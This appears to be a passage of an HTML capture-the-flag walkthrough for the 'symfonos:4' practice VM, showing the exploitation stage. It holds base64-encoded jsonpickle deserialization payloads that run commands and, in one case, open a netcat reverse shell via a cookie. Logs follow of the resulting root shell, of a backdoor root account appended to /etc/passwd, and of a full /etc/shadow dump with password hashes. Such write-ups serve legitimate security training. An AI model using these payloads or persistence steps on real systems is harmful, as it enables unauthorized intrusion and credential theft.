+<pre class="shell"><code>echo -n &quot;eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSAmJiBpZCAmJiBob3N0&quot; | base64 -d
+{&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;: &quot;subprocess.Popen&quot;}, {&quot;py/tuple&quot;: [&quot;whoami &amp;&amp; id &amp;&amp; host</code></pre>
+<pre class="shell"><code>echo -n &quot;eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSAmJiBpZCAmJiBob3N0bmFtZSAmJiBkYXRlICJdfSwgbnVsbCwgbnVsbCwgbnVsbF19&quot; | base64 -d
+{&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;: &quot;subprocess.Popen&quot;}, {&quot;py/tuple&quot;: [&quot;whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; date &quot;]}, null, null, null]}</code></pre>
+<p>Forgot “username: Poseidon”</p>
+<pre class="shell"><code>echo -n &#39;{&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;: &quot;subprocess.Popen&quot;}, {&quot;py/tuple&quot;: [&quot;whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; date &quot;]}, null, null, null], &quot;username&quot;: &quot;Poseidon&quot;}&#39; | base64
+eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6
+ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSAmJiBpZCAmJiBob3N0
+bmFtZSAmJiBkYXRlICJdfSwgbnVsbCwgbnVsbCwgbnVsbF0sICJ1c2VybmFtZSI6ICJQb3NlaWRv
+biJ9
+
+
+echo -n &quot;eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJzdWJwcm9jZXNzLlBvcGVuIn0sIHsicHkvdHVwbGUiOiBbIndob2FtaSAmJiBpZCAmJiBob3N0bmFtZSAmJiBkYXRlICJdfSwgbnVsbCwgbnVsbCwgbnVsbF0sICJ1c2VybmFtZSI6ICJQb3NlaWRvbiJ9&quot; | base64 -d
+{&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;: &quot;subprocess.Popen&quot;}, {&quot;py/tuple&quot;: [&quot;whoami &amp;&amp; id &amp;&amp; hostname &amp;&amp; date &quot;]}, null, null, null], &quot;username&quot;: &quot;Poseidon&quot;}</code></pre>
+<pre class="shell"><code>echo -n &#39;{&quot;py/object&quot;: &quot;__main__.Shell&quot;, &quot;py/reduce&quot;: [{&quot;py/type&quot;: &quot;os.system&quot;}, {&quot;py/tuple&quot;: [&quot;nc -nv 192.168.56.70 444 -e /bin/bash&quot;]}, null, null, null], &quot;username&quot;: &quot;Poseidon&quot;}&#39; | base64
+eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6
+ICJvcy5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsibmMgLW52IDE5Mi4xNjguNTYuNzAgNDQ0IC1l
+IC9iaW4vYmFzaCJdfSwgbnVsbCwgbnVsbCwgbnVsbF0sICJ1c2VybmFtZSI6ICJQb3NlaWRvbiJ9</code></pre>
+<p>Use <code>eyJweS9vYmplY3QiOiAiX19tYWluX18uU2hlbGwiLCAicHkvcmVkdWNlIjogW3sicHkvdHlwZSI6ICJvcy5zeXN0ZW0ifSwgeyJweS90dXBsZSI6IFsibmMgLW52IDE5Mi4xNjguNTYuNzAgNDQ0IC1lIC9iaW4vYmFzaCJdfSwgbnVsbCwgbnVsbCwgbnVsbF0sICJ1c2VybmFtZSI6ICJQb3NlaWRvbiJ9</code> in cookie.</p>
+<h2 id="root-shell">Root shell</h2>
+<pre class="shell"><code>sudo nc -nlvp 444 -s $LHOST
+Listening on 192.168.56.70 444
+Connection received on 192.168.56.93 35032
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+hostname
+symfonos4
+who
+
+date
+Sat 08 Jan 2022 02:37:30 AM CST
+
+cat /etc/system
+
+cd /root
+
+ls
+proof.txt
+
+cat proof.txt
+
+        Congrats on rooting symfonos:4!
+ ~         ~            ~     w   W   w
+                    ~          \  |  /       ~
+        ~        ~        ~     \.|./    ~
+                                  |
+                       ~       ~  |           ~
+       o        ~   .:.:.:.       | ~
+  ~                 wwWWWww      //   ~
+            ((c     ))&quot;&quot;&quot;((     //|        ~
+   o       /\/\((  (( 6 6 ))   // |  ~
+          (d d  ((  )))^(((   //  |
+     o    /   / c((-(((&#39;)))-.//   |     ~
+         /===/ `) (( )))(( ,_/    |~
+  ~     /o o/  / c((( (()) |      |  ~          ~
+     ~  `~`^  / c (((  ))  |      |          ~
+             /c  c(((  (   |  ~   |      ~
+      ~     /  c  (((  .   |      |   ~           ~
+           / c   c ((^^^^^^`\   ~ | ~        ~
+          |c  c c  c((^^^ ^^^`\   |
+  ~        \ c   c   c(^^^^^^^^`\ |    ~
+       ~    `\ c   c  c;`\^^^^^./ |             ~
+              `\c c  c  ;/^^^^^/  |  ~
+   ~        ~   `\ c  c /^^^^/&#39; ~ |       ~
+         ~        `;c   |^^/&#39;     o
+             .-.  ,&#39; c c//^\\         ~
+     ~      ( @ `.`c  -///^\\\  ~             ~
+             \ -` c__/|/     \|
+      ~       `---&#39;   &#39;   ~   &#39;          ~
+ ~          ~          ~           ~             ~
+        Contact me via Twitter @zayotic to give feedback!
+
+exit
+</code></pre>
+<figure>
+<img src="17.rooted.png" alt="" /><figcaption>17.rooted</figcaption>
+</figure>
+<h2 id="etcshadow">/etc/shadow</h2>
+<pre class="shell"><code>```shell
+sudo nc -nlvp 444 -s $LHOST
+Listening on 192.168.56.70 444
+Connection received on 192.168.56.93 35042
+echo &#39;salty:$6$salty$TwLZ.kG/oqyEnXrhYGO8tQPAaX8GVJE5mhKgLSy9yKz7cNjaVNx3.7FtBVn4VEe.daS/nqBRwyEPpOr.jf228.:0:0:root:/:/bin/bash&#39; &gt;&gt; /etc/passwd
+
+exit
+</code></pre>
+<pre class="shell"><code>ssh salty@$RHOST
+salty@192.168.56.93&#39;s password:
+Linux symfonos4 4.19.0-5-686 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Aug 19 18:25:18 2019 from 192.168.1.147
+root@symfonos4:/# whoami
+root
+root@symfonos4:/# id
+uid=0(root) gid=0(root) groups=0(root)
+root@symfonos4:/# cat /etc/shadow
+root:$6$f03/rN.e2MoFvZi6$rQRkzBFZzn1KUu06xyE.WtrJ3cxzyN4r9ArmyrD2KdlLc9FOYJ5HDTO3k0UDsZmKjIhC44d4WdmmrSokX2YCB/:18127:0:99999:7:::
+daemon:*:18125:0:99999:7:::
+bin:*:18125:0:99999:7:::
+sys:*:18125:0:99999:7:::
+sync:*:18125:0:99999:7:::
+games:*:18125:0:99999:7:::
+man:*:18125:0:99999:7:::
+lp:*:18125:0:99999:7:::
+mail:*:18125:0:99999:7:::
+news:*:18125:0:99999:7:::
+uucp:*:18125:0:99999:7:::
+proxy:*:18125:0:99999:7:::
+www-data:*:18125:0:99999:7:::
+backup:*:18125:0:99999:7:::
+list:*:18125:0:99999:7:::
+irc:*:18125:0:99999:7:::
+gnats:*:18125:0:99999:7:::
+nobody:*:18125:0:99999:7:::
+_apt:*:18125:0:99999:7:::
+systemd-timesync:*:18125:0:99999:7:::
+systemd-network:*:18125:0:99999:7:::
+systemd-resolve:*:18125:0:99999:7:::
+messagebus:*:18125:0:99999:7:::
+avahi-autoipd:*:18125:0:99999:7:::
+sshd:*:18125:0:99999:7:::
+poseidon:$6$t2xm9gQNTPFD0Uci$cSW8pjR8qX8HqLavVKo7mLIkf6mkXD34eS8tirfOCCDnLqbob5T9DcLuqIXr.D4iPNzyw3NJBMqHZsmBIQWbx0:18127:0:99999:7:::
+systemd-coredump:!!:18125::::::
+mysql:!:18126:0:99999:7:::
+root@symfonos4:/#</code></pre>
 </body>
 </html>
